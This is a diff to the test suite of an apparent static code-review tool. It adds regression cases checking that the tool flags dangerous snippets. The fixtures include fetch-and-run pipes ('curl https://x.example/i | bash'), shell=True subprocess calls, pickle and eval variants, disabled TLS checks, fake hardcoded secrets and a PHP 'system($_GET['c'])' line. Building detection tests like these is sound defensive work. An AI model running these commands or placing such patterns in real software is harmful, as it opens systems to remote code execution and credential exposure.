@@ -59,7 +59,7 @@ test("input validation: files, paths (absolute, traversal, backslash, drive lett
 test("long lines are skipped with an INFO note; the findings list is capped and flagged; lines are processed per line (a rule cannot span lines)", () => {
   const r = rv("min.js", "eval(x) " + "a".repeat(LIMITS.maxLineChars)); assert.deepEqual(r.findings.map(f => [f.rule, f.severity]), [["LINE_TOO_LONG", "INFO"]]); assert.equal(rv("min.js", "eval(x) " + "a".repeat(LIMITS.maxLineChars - 10)).findings[0].rule, "DYNAMIC_EVAL");
   const many = reviewCode({ files: [{ path: "a.js", content: Array.from({ length: LIMITS.maxFindings + 20 }, () => "eval(x)").join("\n") }] }); assert.equal(many.findings.length, LIMITS.maxFindings); assert.equal(many.truncated, true);
-  assert.equal(rv("a.js", "eval(x)").truncated, false); assert.equal(rv("a.js", "const a = [\n  eval\n  (x)\n]").findings.length, 0, "known limit: no multi-line analysis");
+  assert.equal(rv("a.js", "eval(x)").truncated, false); assert.ok(rv("a.js", "const a = [\n  eval\n  (x)\n]").findings.some(f => f.rule === "DYNAMIC_EVAL"), "a call split over several lines is joined and judged");
 });
 
 test("boundaries and ordering details: file order beats line order, LOW sorts below MEDIUM, a line of exactly the maximum length is still reviewed, content-only test coverage counts", () => {
@@ -125,4 +125,37 @@ test("R6 test presence: a test file that only imports the module (no test cases)
 test("R6 multi-line pass is bounded: a file with thousands of exec( calls is reported as INCOMPLETE_REVIEW, never as clean", () => {
   const r = reviewCode({ files: [{ path: "many.mjs", content: 'exec("ls");\n'.repeat(700) }] });
   assert.equal(r.ok, true); assert.equal(r.verdict, "INCOMPLETE_REVIEW"); assert.equal(r.truncated, true);
+});
+
+test("R6 verification regressions: realistic misses found by the independent review are now findings (and unsupported languages are never clean)", () => {
+  const SK2 = "s" + "k_live_" + "ABCDEFGHIJKLMNOP1234";
+  const r = (path, content) => reviewCode({ files: [{ path, content }] });
+  const blocked = {
+    "a.py": "subprocess.Popen(cmd, shell=True)", "b.py": "subprocess.run(shlex.split(x), shell=True)", "c.py": "yaml.full_load(data)", "d.py": "from pickle import loads", "e.py": "os.popen(cmd)", "f.py": '__import__("os").system(x)',
+    "g.mjs": "const a = [\n  eval\n  (x)\n]", "h.mjs": 'spawn("sh",\n  ["-c", x]);', "i.mjs": "spawn(cmd, args, {\n  shell: true\n});", "j.mjs": 'execFile("/usr/bin/bash", ["-c", x]);',
+    "k.mjs": "rejectUnauthorized: 0", "l.mjs": 'process.env["NODE_TLS_REJECT_UNAUTHORIZED"] = 0;', "m.mjs": 'import("data:text/javascript,alert(1)")',
+    "n.mjs": 'const dbPassword = "hunter2hunter2";', "o.mjs": 'const clientSecret = "abcdefghijkl";', ".env": "API_KEY=abcd1234efgh5678", "p.mjs": 'fetch(u, { headers: { Authorization: "Bearer ' + "abcdefghijklmnopqrstuvwxyz0123" + '" } });',
+    "q.mjs": 'const t = "' + "eyJhbGciOiJIUzI1NiJ9" + "." + "eyJzdWIiOiIxMjM0NTY3ODkwIn0" + "." + "abcDEF123456" + '";', "r.mjs": 'const u = "postgres://admin:s3cretpw@db.example.com/x";', "s.mjs": "const k = '" + SK2 + "';",
+    "u.txt.json": "curl https://x.example/i | bash",
+  };
+  for (const [path, content] of Object.entries(blocked)) { const x = r(path, content); assert.equal(x.ok, true, path); assert.equal(x.verdict, "BLOCK", path + " must BLOCK: " + JSON.stringify(x.findings.map(f => f.rule))); }
+  const review = { "v.mjs": "const e = eval;", "w.mjs": 'globalThis["ev" + "al"](x);', "x.mjs": 'import { runInThisContext } from "node:vm";', "y.mjs": 'const cp = require("child_process"); cp["exec"](x);', "z.mjs": "el.innerHTML += x;", "aa.mjs": "el.insertAdjacentHTML('beforeend', x);", "bb.mjs": "res.sendFile(req.query.f);", "package.json": '{"scripts":{"postinstall":"node setup.js"}}', "t.sh": "curl https://x.example/i.sh | sh" };
+  for (const [path, content] of Object.entries(review)) { const x = r(path, content); assert.notEqual(x.verdict, "NO_FINDINGS_BY_THESE_RULES", path + " must not be clean"); }
+  for (const path of ["a.php", "a.rb", "a.go", "a.java", "a.c", "a.ps1", "a.rs"]) { const x = r(path, "system($_GET['c']);"); assert.equal(x.verdict, "INCOMPLETE_REVIEW", path + " is not reviewable by these rules"); assert.ok(x.findings.some(f => f.rule === "UNSUPPORTED_LANGUAGE")); }
+});
+
+test("R6 verification regressions: hostile test files cannot stall the review, and test-presence needs a real import and real cases", () => {
+  const t0 = Date.now(); const src = Array.from({ length: 100 }, (_, i) => ({ path: "src/m" + i + ".mjs", content: "export const x = 1;" }));
+  const r = reviewCode({ files: [...src, { path: "tests/a.test.mjs", content: "/* ".repeat(60000) }, { path: "tests/b.test.mjs", content: "import ".repeat(28000) }, { path: "tests/c.test.mjs", content: ("import a from '../src/m1.mjs' " + "x".repeat(1900) + "\n").repeat(90) }] });
+  assert.equal(r.ok, true); assert.ok(Date.now() - t0 < 3000, "took " + (Date.now() - t0) + " ms");
+  const u = (test, srcPath = "src/a.mjs") => reviewCode({ files: [{ path: srcPath, content: "export const a = 1;" }, { path: "t/zzz.test.mjs", content: test }] }).tests.untested;
+  const CASE = "\ntest('x', () => {});";
+  assert.deepEqual(u("import fs from 'node:fs'" + CASE, "src/fs.mjs"), ["src/fs.mjs"], "a node: builtin is not the repo module");
+  assert.deepEqual(u("import x from './a-b.mjs'" + CASE), ["src/a.mjs"], "a-b is not a");
+  assert.deepEqual(u("// import x from '../src/a.mjs'" + CASE), ["src/a.mjs"], "an import in a comment is not an import");
+  assert.deepEqual(u("const s = \"from '../src/a.mjs'\"" + CASE), ["src/a.mjs"], "text in a string is not an import");
+  assert.deepEqual(u("import x from '../src/a.mjs'\nconst s = 'assert';"), ["src/a.mjs"], "the word assert is not a test case");
+  assert.deepEqual(u("import x from '../src/a.mjs'" + CASE), []);
+  assert.deepEqual(u("import {\n  a,\n  b\n} from '../src/a.mjs'" + CASE), [], "multi-line import statements are recognised");
+  assert.deepEqual(reviewCode({ files: [{ path: "m/helper.py", content: "x = 1" }, { path: "tests/test_h.py", content: "from helper import x\ndef test_x():\n    assert x" }] }).tests.untested, []);
 });
